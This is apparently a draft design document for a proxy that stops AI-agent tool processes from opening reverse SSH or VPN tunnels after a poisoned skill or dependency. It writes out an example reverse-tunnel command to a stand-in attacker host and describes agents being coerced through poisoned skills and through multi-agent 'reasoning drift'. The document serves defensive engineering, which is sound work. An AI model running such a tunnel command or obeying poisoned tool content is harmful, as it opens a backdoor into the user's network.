# Design Doc: Reverse SSH Interception Proxy
**Status:** Draft
**Created:** 2026-04-30

## 1. Context and Scope
The "BoryptGrab" malware campaign has demonstrated a sophisticated exfiltration vector where AI agents are coerced into downloading and executing malicious payloads that establish "Reverse SSH" tunnels. These tunnels allow attackers to bypass traditional ingress firewall rules by initiating an outbound connection from the agent's environment to an attacker-controlled server, effectively "turning the network inside out."

MCP Any needs a defense-in-depth mechanism that monitors the socket-level behavior of all tool processes to detect and block unauthorized out-of-band communication channels.

## 2. Goals & Non-Goals
* **Goals:**
    * Implement L7 socket inspection for all processes spawned by MCP tool calls.
    * Detect unauthorized tunnel establishment attempts (SSH, VPN, WireGuard).
    * Provide real-time blocking and alerting for "Out-of-Band" (OOB) traffic.
    * Integrate with the Ephemeral Privilege Manager (EPM) to revoke all leases upon detection.
* **Non-Goals:**
    * Full network traffic analysis (focus is only on tool-initiated sockets).
    * General purpose firewalling (e.g., blocking system-wide SSH).

## 3. Critical User Journey (CUJ)
* **User Persona:** Corporate Security Architect
* **Primary Goal:** Prevent an agent from establishing a backdoor into the corporate intranet via a poisoned community skill.
* **The Happy Path (Tasks):**
    1. Agent executes a "Cloud Downloader" tool to fetch a project dependency.
    2. The dependency contains a hidden BoryptGrab payload that attempts to run `ssh -R 8080:localhost:22 attacker.com`.
    3. The Reverse SSH Interception Proxy detects the SSH protocol handshake on a non-authorized outbound port.
    4. The Proxy immediately kills the tool process and all associated sub-processes.
    5. The Proxy sends a "Security Violation" signal to MCP Any.
    6. MCP Any revokes all active privilege leases for the agent and notifies the user via the A2UI dashboard.

## 4. Design & Architecture
* **System Flow:**
    ```mermaid
    graph TD
        Agent[Agent] -->|Tool Call| Gateway[Tool Gateway]
        Gateway -->|Spawn| Process[Tool Process]
        Process -->|Socket Open| Interceptor[Reverse SSH Interception Proxy]
        Interceptor -->|Protocol Match| Logic{Is SSH/VPN?}
        Logic -->|Yes| Kill[Kill Process & Revoke Leases]
        Logic -->|No| Allow[Allow Traffic]
    ```
* **APIs / Interfaces:**
    * Internal `SocketMonitor` interface that hooks into the OS process lifecycle.
    * `SecurityViolation` event bus for inter-service communication.
* **Data Storage/State:**
    * "Allowed Sockets" whitelist (e.g., standard HTTP/HTTPS for API calls).
    * Real-time "Process-to-Socket" mapping table.

## 5. Alternatives Considered
* **IP Whitelisting:** Rejected because attackers use dynamic cloud IPs or hijacked legitimate domains.
* **Static Binary Analysis:** Rejected because the SSH client might be a legitimate system binary weaponized via arguments.

## 6. Cross-Cutting Concerns
* **Security (Zero Trust):** The interceptor runs with higher privilege than the tool processes to ensure it cannot be bypassed.
* **Observability:** Detailed socket-level logs are streamed to the "Local Security Audit Dashboard."

## 7. Evolutionary Changelog
* **2026-04-30:** Initial Document Creation. Addressing the evolution of BoryptGrab Reverse SSH payloads.

### Update: 2026-05-01 - Mitigating Swarm-in-the-Middle (SitM)
**Context:** Today's research revealed that "Swarm-in-the-Middle" (SitM) attacks use legitimate tool-call sockets to introduce gradual "Reasoning Drift" across the agent chain.
**Architecture Adjustment:**
- Integrating the "Holistic SitM Integrity Validator" into the Interception Proxy.
- Monitoring the "Semantic Integral" over the socket-level JSON-RPC traffic to detect anomalous intent divergence during multi-agent handoffs.
**Security Impact:** Neutralizes SitM attacks that rely on subtler reasoning manipulation rather than direct out-of-band tunnel establishment.
